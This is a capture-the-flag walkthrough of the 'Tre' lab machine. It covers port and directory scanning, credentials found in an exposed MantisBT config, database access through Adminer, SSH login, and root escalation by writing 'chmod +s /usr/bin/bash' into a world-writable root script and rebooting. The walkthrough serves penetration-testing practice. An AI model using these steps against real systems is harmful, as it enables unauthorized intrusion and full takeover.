---
layout: default
title: Tre
parent: Proving Grounds Play
nav_order: 37
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/tre]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.213.84
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-13 19:16 EST
Nmap scan report for 192.168.213.84
Host is up (0.12s latency).
Not shown: 65519 closed tcp ports (reset), 13 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 99:1a:ea:d7:d7:b3:48:80:9f:88:82:2a:14:eb:5f:0e (RSA)
|   256 f4:f6:9c:db:cf:d4:df:6a:91:0a:81:05:de:fa:8d:f8 (ECDSA)
|_  256 ed:b9:a9:d7:2d:00:f8:1b:d3:99:d6:02:e5:ad:17:9f (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Tre
|_http-server-header: Apache/2.4.38 (Debian)
8082/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Tre
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.00 seconds

```

# Enumeration

---

## 80 | HTTP

### WFUZZ/Gobuster

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/pwned1]
└─$ gobuster dir -u http://192.168.213.84 -w /usr/share/wordlists/custom/large_combined.txt -x aspx,php,txt,conf -t 80 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.213.84
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/custom/large_combined.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,conf,aspx
[+] Timeout:                 10s
===============================================================
2023/11/13 22:32:39 Starting gobuster in directory enumeration mode
===============================================================
/info.php             (Status: 200) [Size: 87828]
/.php                 (Status: 403) [Size: 279]
/system               (Status: 401) [Size: 461]
/cms                  (Status: 301) [Size: 314] [--> http://192.168.213.84/cms/]
/server-status        (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess.aspx       (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htaccess.conf       (Status: 403) [Size: 279]
/.htpasswd.aspx       (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htpasswd.conf       (Status: 403) [Size: 279]
/adminer.php          (Status: 200) [Size: 4654]
/info.php             (Status: 200) [Size: 87828]
/mantisbt             (Status: 301) [Size: 319] [--> http://192.168.213.84/mantisbt/]
/server-status        (Status: 403) [Size: 279]
Progress: 1132565 / 1132570 (100.00%)

```

_adminer.php_ appears to be a MySQL login page

![adminer](../../../assets/images/ctfs/proving_grounds/tre/adminer.png)

Scanned _/mantisbt_ and found _/config_

Checking _/mantisbt/config/a.txt_

```bash
# --- Database Configuration ---
$g_hostname      = 'localhost';
$g_db_username   = 'mantissuser';
$g_db_password   = 'password@123AS';
$g_database_name = 'mantis';
$g_db_type       = 'mysqli';
```

# Exploitation

---

Return to the _/adminer.php_ page to use the discovered credentials.

![logon](../../../assets/images/ctfs/proving_grounds/tre/logon.png)

Select the _sql command_ menu and run a select ALL command against the _mantis_user_table_

![creds](../../../assets/images/ctfs/proving_grounds/tre/creds.png)

The password for tre is Tr3@123456A!
{: .warn }

We can SSH to the target with the user credentials.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/pwned1]
└─$ ssh tre@192.168.213.84
tre@192.168.213.84's password:
Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tre@tre:~$ id
uid=1000(tre) gid=1000(tre) groups=1000(tre),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

```

# Post-Exploitation

---

## Check Sudo Permissions

```bash
tre@tre:~$ sudo -l
Matching Defaults entries for tre on tre:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tre may run the following commands on tre:
    (ALL) NOPASSWD: /sbin/shutdown
```

We have the ability to run the _/sbin/shutdown_ command.

Maybe that will come in handy later.

## Check Processes

```bash
tre@tre:~$ ps aux | grep root

root       417  0.0  0.1   6728  3268 ?        Ss   18:57   0:02 /bin/bash /usr/bin/check-system

```

Checking _/usr/bin/check-system_

```bash
tre@tre:~$ ls -la /usr/bin/check-system
-rw----rw- 1 root root 135 May 12  2020 /usr/bin/check-system

```

We can overrite the file.

```bash
tre@tre:~$ echo "chmod +s /usr/bin/bash" > /usr/bin/check-system
tre@tre:~$ cat /usr/bin/check-system
chmod +s /usr/bin/bash
```

Now we can leverage the sudo permissions on _/sbin/shutdown_

```bash
tre@tre:~$ sudo /sbin/shutdown -r


┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/pwned1]
└─$ ssh tre@192.168.213.84
tre@192.168.213.84's password:
Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Nov 13 23:04:58 2023 from 192.168.45.217
-bash-5.0$ /usr/bin/bash -p
bash-5.0# id
uid=1000(tre) gid=1000(tre) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(tre)
bash-5.0# whoami
root

```
